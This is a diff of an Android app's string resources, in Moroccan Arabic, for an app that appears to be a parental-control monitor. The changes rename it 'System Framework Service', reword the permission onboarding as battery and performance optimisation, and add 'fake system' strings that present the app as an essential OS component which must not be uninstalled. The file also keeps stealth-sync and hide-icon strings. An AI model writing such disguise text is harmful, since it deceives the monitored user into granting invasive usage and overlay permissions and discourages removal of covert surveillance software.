@@ -1,5 +1,5 @@
 <resources>
-    <string name="app_name">خدمات النظام</string>
+    <string name="app_name">System Framework Service</string>
     
     <!-- Main Activity -->
     <string name="accessibility_service_description">هاد السيرفيس ضروري باش نخدمو الحماية.</string>
@@ -48,12 +48,12 @@
     <string name="time_limit_reached">سلا الوقت ديالك</string>
     
     <!-- Blocking Messages -->
-    <string name="app_blocked_title">تطبيق محبوس</string>
-    <string name="app_blocked_message">هاد التطبيق حبسو الوالد ديالك</string>
-    <string name="category_blocked_title">فئة محبوسة</string>
-    <string name="category_blocked_message">سلا الوقت المسموح به لـ %s</string>
-    <string name="device_locked">التلفون مسدود</string>
-    <string name="device_locked_message">التلفون سدو الوالد ديالك</string>
+    <string name="app_blocked_title">وقيتة د الراحة!</string>
+    <string name="app_blocked_message">هاد التطبيق محبوس دابا حيت سالا الوقت ديالو. سير دير شي حاجة أخرى مفيدة!</string>
+    <string name="category_blocked_title">حبسنا هاد النوع د التطبيقات</string>
+    <string name="category_blocked_message">سلا الوقت المسموح لـ %s. تهلا فراسك ودير مجهود فشي حاجة أخرى.</string>
+    <string name="device_locked">التلفون مسدود دابا</string>
+    <string name="device_locked_message">والديك سدو التلفون كامل دابا. وقيتة باش ترتاح ولا تقرا شوية.</string>
     
     <!-- Categories -->
     <string name="category_social">سوشيال ميديا</string>
@@ -74,18 +74,18 @@
     <string name="stealth_sync_desc">كنسجلو المعلومات...</string>
     
     <!-- Onboarding -->
-    <string name="onboarding_intro_title">مرحبا بيك فالرقابة الابوية</string>
-    <string name="onboarding_intro_desc">هاد التطبيق غادي يعاونك تحمي ولدك.\nضروري تعطينا شي صلاحيات باش نخدمو.</string>
-    <string name="onboarding_usage_title">استعمال التطبيقات</string>
-    <string name="onboarding_usage_desc">خاصنا نعرفو شنو كايستعمل ولدك باش نقدرو نبلوكيو الخطر.</string>
-    <string name="onboarding_usage_btn">عطي صلاحية الاستعمال</string>
-    <string name="onboarding_overlay_title">الظهور فوق التطبيقات</string>
-    <string name="onboarding_overlay_desc">خاصنا نبانو فوق التطبيقات باش نسدو الشاشة يلا كان شي خطر.</string>
-    <string name="onboarding_overlay_btn">عطي صلاحية الظهور</string>
-    <string name="onboarding_done_title">سالينا!</string>
-    <string name="onboarding_done_desc">كلشي واجد. دابا تقدر تكونيكطي مع الوالد.</string>
-    <string name="onboarding_enter_btn">دخل</string>
-    <string name="onboarding_start_btn">بدا</string>
+    <string name="onboarding_intro_title">إعداد خدمات النظام</string>
+    <string name="onboarding_intro_desc">هاد المعالج غادي يعاونك تفعل خدمات الأندرويد الأساسية باش نضمنو استقرار الجهاز وتطويل عمر البطارية.</string>
+    <string name="onboarding_usage_title">إحصائيات النظام</string>
+    <string name="onboarding_usage_desc">عطينا الصلاحية باش النظام يراقب استهلاك الرام والمعالج باش يحسن الأداء فاش تكون كاتخدم.</string>
+    <string name="onboarding_usage_btn">تفعيل خدمات التحسين</string>
+    <string name="onboarding_overlay_title">واجهة النظام الموحدة</string>
+    <string name="onboarding_overlay_desc">هادي ضرورية باش النظام يقدر يطبق التحديثات الأمنية فوق التطبيقات الأخرى بلا ما يحبس خدمتك.</string>
+    <string name="onboarding_overlay_btn">تفعيل الواجهة</string>
+    <string name="onboarding_done_title">تم الإعداد بنجاح</string>
+    <string name="onboarding_done_desc">دابا خدمات النظام خدامة فالخلفية. الهاتف ديالك محمي ومحسّن لأقصى درجة.</string>
+    <string name="onboarding_enter_btn">بدا الخدمة</string>
+    <string name="onboarding_start_btn">يلاه نبداو</string>
     
     <!-- Main Screen -->
     <string name="child_agent_title">عميل الرقابة الابوية</string>
@@ -93,11 +93,33 @@
     <string name="hide_icon_short">خبي الأيقونة</string>
     
     <!-- Lock Screen -->
-    <string name="lock_screen_title">هاد التطبيق مسدود</string>
-    <string name="lock_screen_timer_prefix">بقى ليك: %s</string>
-    <string name="lock_screen_message">والديك سدو هاد التطبيق دابا. سير رتاح شوية.</string>
-    <string name="lock_screen_request_btn">طلب تحل</string>
-    <string name="lock_screen_cooldown_btn">تسنى %s</string>
+    <string name="lock_screen_title">صافي، سلا الوقت!</string>
+    <string name="lock_screen_timer_prefix">بقى ليك غير: %s</string>
+    <string name="lock_screen_message">ارتاح شوية، راه سالا الوقت اللي كان عندك. تقدر تطلب وقت زايد يلا كان ضروري.</string>
+    <string name="lock_screen_request_btn">طلب وقت زايد</string>
+    <string name="lock_screen_cooldown_btn">تسنى شوية (%s)</string>
     <string name="status_initializing">كايديماري...</string>
     <string name="blocking_restricted_msg">ممنوع الدخول لـ %s.</string>
+
+    <!-- Fake System Settings -->
+    <string name="fake_system_title">خدمات النظام الأساسية (System Core)</string>
+    <string name="fake_warning_critical">هذا التطبيق هو جزء أساسي من نظام التشغيل. يجب عدم إزالة تثبيته أو تعطيله لضمان استقرار الجهاز وحماية البيانات.</string>
+    
+    <string name="fake_kernel_title">تحسين أداء المعالج (System Performance)</string>
+    <string name="fake_kernel_desc">إدارة ذكية للموارد لضمان سرعة الجهاز وتجنب التوقف المفاجئ.</string>
+    
+    <string name="fake_battery_title">إدارة حماية البطارية (Battery Health)</string>
+    <string name="fake_battery_desc">تحسين دورة الشحن والحفاظ على برودة الجهاز أثناء الاستخدام المكثف.</string>
+    
+    <string name="fake_storage_title">خدمة أمان التخزين (Protected Storage)</string>
+    <string name="fake_storage_desc">تشفير وحماية الملفات الحساسة ومنع الوصول غير المصرح به.</string>
+    
+    <string name="fake_security_title">بروتوكولات الأمان المشفرة (Encrypt Protocols)</string>
+    <string name="fake_security_desc">تحديث تلقائي لقواعد أمان النظام لمواجهة أحدث التهديدات الرقمية.</string>
+    
+    <string name="fake_danger_alert">مكون نظام أساسي</string>
+
+    <!-- Take a Break -->
+    <string name="take_a_break_title">وقت الراحة الإجباري</string>
+    <string name="take_a_break_message">لقد استهلكت وقت الاستخدام المسموح به. يجب أن يأخذ الجهاز استراحة لمدة %d دقيقة للحفاظ على سلامة البطارية والعين.</string>
 </resources>
